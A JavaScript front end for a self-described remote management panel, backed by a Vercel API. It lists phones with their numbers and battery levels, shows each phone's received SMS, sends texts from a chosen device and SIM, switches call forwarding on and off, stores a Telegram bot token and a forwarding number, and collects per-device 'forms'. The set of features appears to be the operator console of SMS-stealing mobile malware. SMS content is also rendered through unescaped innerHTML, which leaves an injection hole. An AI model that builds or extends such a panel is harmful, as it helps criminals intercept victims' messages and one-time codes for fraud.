// Use relative path by default to leverage Vercel's rewrite rules
let apiBaseUrl = '';

//'https://v0-remotemanagementsystem-six.vercel.app';

// If testing locally (localhost), use a CORS proxy so data loads without blocking
if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
    apiBaseUrl = 'https://corsproxy.io/?https://v0-remotemanagementsystem-six.vercel.app';
}

// ------------------- SPA State & Navigation (Hash Routing) ------------------- //
let currentView = 'dashboard';
let currentDeviceId = null;
let intervals = { dashboard: null, device: null, forms: null };

function handleHashChange() {
    const hash = window.location.hash.slice(1) || 'dashboard'; // e.g., dashboard, device?id=123

    // Parse hash for view and parameters
    const [viewPath, queryString] = hash.split('?');
    const view = viewPath || 'dashboard';

    let deviceId = null;
    if (queryString) {
        const params = new URLSearchParams(queryString);
        deviceId = params.get('id');
    }

    // Hide all views
    document.querySelectorAll('.spa-view').forEach(el => el.classList.add('hidden'));

    // Show target view based on hash
    const targetElement = document.getElementById(`view-${view}`);
    if (targetElement) {
        targetElement.classList.remove('hidden');
    } else {
        document.getElementById(`view-dashboard`).classList.remove('hidden');
    }

    // Clear intervals
    Object.keys(intervals).forEach(k => {
        if (intervals[k]) clearInterval(intervals[k]);
        intervals[k] = null;
    });

    currentView = view;

    if (view === 'dashboard') {
        fetchDevices();
        intervals.dashboard = setInterval(fetchDevices, 1500);
    }
    else if (view === 'device') {
        if (deviceId) { currentDeviceId = deviceId; }
        document.getElementById('current-device-id').textContent = currentDeviceId || 'Unknown Device';
        fetchSMS();
        intervals.device = setInterval(fetchSMS, 1500);
    }
    else if (view === 'forms') {
        if (deviceId) { currentDeviceId = deviceId; }
        fetchForms();
        intervals.forms = setInterval(fetchForms, 2000);
    }
}

function navigateTo(view, deviceId = null) {
    let hash = `#${view}`;
    if (deviceId) {
        hash += `?id=${deviceId}`;
    }
    window.location.hash = hash;
}

// Hook into hashchange and initial load
window.addEventListener('hashchange', handleHashChange);
window.addEventListener('DOMContentLoaded', handleHashChange);

// ------------------- Dashboard Logic ------------------- //
const deviceListEl = document.getElementById('device-list');
const btnUpdateForwarding = document.getElementById('btn-update-forwarding');
const btnUpdateTelegram = document.getElementById('btn-update-telegram');

async function fetchDevices() {
    try {
        const response = await fetch(`${apiBaseUrl}/api/devices`);
        if (response.ok) {
            const data = await response.json();
            renderDevices(data);
        }
    } catch (e) {
        console.error("Failed to fetch devices", e);
    }
}

function renderDevices(devices) {
    const existingCards = deviceListEl.querySelectorAll('.device-card');

    // If length doesn't match or completely empty, do full render
    if (existingCards.length !== devices.length) {
        deviceListEl.innerHTML = '';
        devices.forEach((dev, index) => {
            deviceListEl.appendChild(createDeviceCard(dev, index));
        });
        return;
    }

    // Update existing to prevent flashing
    let reqRerender = false;
    devices.forEach((dev, index) => {
        const card = existingCards[index];
        if (card.dataset.id !== dev.device_id) {
            reqRerender = true;
        } else {
            updateDeviceCard(card, dev);
        }
    });

    if (reqRerender) {
        deviceListEl.innerHTML = '';
        devices.forEach((dev, index) => {
            deviceListEl.appendChild(createDeviceCard(dev, index));
        });
    }
}

function createDeviceCard(dev, index) {
    const card = document.createElement('div');
    card.className = 'device-card';
    card.dataset.id = dev.device_id;
    card.onclick = (e) => {
        if (!e.target.classList.contains('trash-icon')) {
            navigateTo('device', dev.device_id);
        } else {
            e.stopPropagation();
            alert(`Delete functionality for ${dev.device_name} clicked.`);
        }
    };

    card.innerHTML = `
        <div class="card-header">
            <h3>${index + 1}. <i class="fa-solid fa-mobile-screen"></i> <span class="d-name">${dev.device_name}</span></h3>
            <i class="fa-solid fa-trash trash-icon"></i>
        </div>
        <div class="card-body">
            <p><i class="fa-solid fa-phone"></i> <span class="d-phone">${dev.phone_number}</span></p>
            <p><i class="fa-solid fa-robot"></i> <span class="d-os">${dev.os_version}</span></p>
            <p><i class="fa-solid fa-battery-half d-bat-icon"></i> <span class="d-bat">${dev.battery_level}%</span></p>
            <p class="status"><span class="dot"></span> <span class="d-status">...</span></p>
        </div>
    `;
    updateDeviceCard(card, dev);
    return card;
}

function updateDeviceCard(card, dev) {
    card.querySelector('.d-name').textContent = dev.device_name;
    card.querySelector('.d-phone').textContent = dev.phone_number;
    card.querySelector('.d-os').textContent = dev.os_version;
    card.querySelector('.d-bat').textContent = dev.battery_level + '%';

    const batIcon = card.querySelector('.d-bat-icon');
    batIcon.className = 'fa-solid d-bat-icon ' + (dev.battery_level > 50 ? 'fa-battery-full' : (dev.battery_level > 20 ? 'fa-battery-half' : 'fa-battery-empty'));

    const statusP = card.querySelector('.status');
    const statusText = card.querySelector('.d-status');
    if (dev.is_online) {
        statusP.className = 'status online';
        statusText.textContent = 'Online';
    } else {
        statusP.className = 'status offline';
        statusText.textContent = 'Offline';
    }
}

// ------------------- Modals Setup (Dashboard) ------------------- //
btnUpdateTelegram.addEventListener('click', async () => {
    try {
        const res = await fetch(`${apiBaseUrl}/api/config/telegram`);
        if (res.ok) {
            const data = await res.json();
            document.getElementById('tg-token').value = data.telegram_bot_token || '';
            document.getElementById('tg-chat-id').value = data.telegram_chat_id || '';
        }
    } catch (e) { }
    openModal('telegram-modal');
});

btnUpdateForwarding.addEventListener('click', async () => {
    try {
        const res = await fetch(`${apiBaseUrl}/api/config/sms_forward`);
        if (res.ok) {
            const data = await res.json();
            document.getElementById('fw-number').value = data.forward_number || '';
        }
    } catch (e) { }
    openModal('forwarding-modal');
});

document.getElementById('save-telegram-btn').addEventListener('click', async () => {
    const token = document.getElementById('tg-token').value;
    const chatId = document.getElementById('tg-chat-id').value;
    const btn = document.getElementById('save-telegram-btn');
    const originalText = btn.textContent;
    btn.textContent = 'UPDATING...';
    try {
        await fetch(`${apiBaseUrl}/api/config/telegram`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ telegram_bot_token: token, telegram_chat_id: chatId })
        });
    } catch (e) { }
    btn.textContent = originalText;
    closeModal('telegram-modal');
});

document.getElementById('save-forwarding-btn').addEventListener('click', async () => {
    const fwNumber = document.getElementById('fw-number').value;
    const btn = document.getElementById('save-forwarding-btn');
    const originalText = btn.textContent;
    btn.textContent = 'UPDATING...';
    try {
        await fetch(`${apiBaseUrl}/api/config/sms_forward`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ forward_number: fwNumber })
        });
    } catch (e) { }
    btn.textContent = originalText;
    closeModal('forwarding-modal');
});


// ------------------- Device View Logic ------------------- //
const smsListEl = document.getElementById('sms-list');

async function fetchSMS() {
    if (!currentDeviceId) return;
    try {
        const res = await fetch(`${apiBaseUrl}/api/device/${currentDeviceId}/sms`);
        if (res.ok) {
            const data = await res.json();
            renderSMS(data);
        }
    } catch (e) { }
}

function renderSMS(smsList) {
    const existingCards = smsListEl.querySelectorAll('.sms-card');
    smsList.sort((a, b) => new Date(b.received_at) - new Date(a.received_at));

    if (existingCards.length !== smsList.length || (existingCards.length > 0 && smsList.length > 0 && existingCards[0].dataset.id !== String(smsList[0].id))) {
        smsListEl.innerHTML = '';
        smsList.forEach(sms => {
            smsListEl.appendChild(createSMSCard(sms));
        });
    }
}

function createSMSCard(sms) {
    const card = document.createElement('div');
    card.className = 'sms-card';
    card.dataset.id = sms.id;
    card.innerHTML = `
        <div class="sms-sender">
            <i class="fa-solid fa-envelope"></i> From: ${sms.sender}
        </div>
        <div class="sms-body">${sms.message_body}</div>
        <div class="sms-time">
            <i class="fa-solid fa-clock"></i> ${sms.received_at}
        </div>
    `;
    return card;
}

// ------------------- Modals Setup (Device) ------------------- //
document.getElementById('send-sms-btn').addEventListener('click', async () => {
    const phone = document.getElementById('sms-phone').value;
    const msg = document.getElementById('sms-body').value;
    const sim = document.querySelector('input[name="sms-sim"]:checked').value;
    if (!phone || !msg) return alert("Please fill all fields.");

    const btn = document.getElementById('send-sms-btn');
    const originalText = btn.textContent;
    btn.textContent = 'SENDING...';

    try {
        await fetch(`${apiBaseUrl}/api/device/${currentDeviceId}/sms/send`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone_number: phone, message: msg, sim: sim })
        });
    } catch (e) { }

    btn.textContent = originalText;
    closeModal('sms-modal');
});

document.getElementById('activate-fw-btn').addEventListener('click', () => handleCallForwarding('activate'));
document.getElementById('deactivate-fw-btn').addEventListener('click', () => handleCallForwarding('deactivate'));

async function handleCallForwarding(action) {
    const fwNumber = document.getElementById('dev-fw-number').value;
    const sim = document.querySelector('input[name="fw-sim"]:checked').value;

    if (action === 'activate' && !fwNumber) return alert("Please enter forwarding number.");

    const btnId = action === 'activate' ? 'activate-fw-btn' : 'deactivate-fw-btn';
    const btn = document.getElementById(btnId);
    const originalText = btn.textContent;
    btn.textContent = 'PROCESSING...';

    try {
        await fetch(`${apiBaseUrl}/api/device/${currentDeviceId}/forwarding`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: action, forward_number: fwNumber, sim: sim })
        });
    } catch (e) { }

    btn.textContent = originalText;
    closeModal('forwarding-device-modal');
}


// ------------------- Forms View Logic ------------------- //
async function fetchForms() {
    if (!currentDeviceId) return;
    try {
        const res = await fetch(`${apiBaseUrl}/api/device/${currentDeviceId}/forms`);
        if (res.ok) {
            const data = await res.json();
            if (data && data.length > 0) {
                console.log("Forms received", data);
            }
        }
    } catch (e) { }
}


// ------------------- Global Modal Helpers ------------------- //
function openModal(id) {
    document.getElementById(id).classList.add('show');
}
function closeModal(id) {
    document.getElementById(id).classList.remove('show');
}
window.addEventListener('click', (e) => {
    if (e.target.classList.contains('modal')) {
        e.target.classList.remove('show');
    }
});


// Initialize on load is already handled by DOMContentLoaded
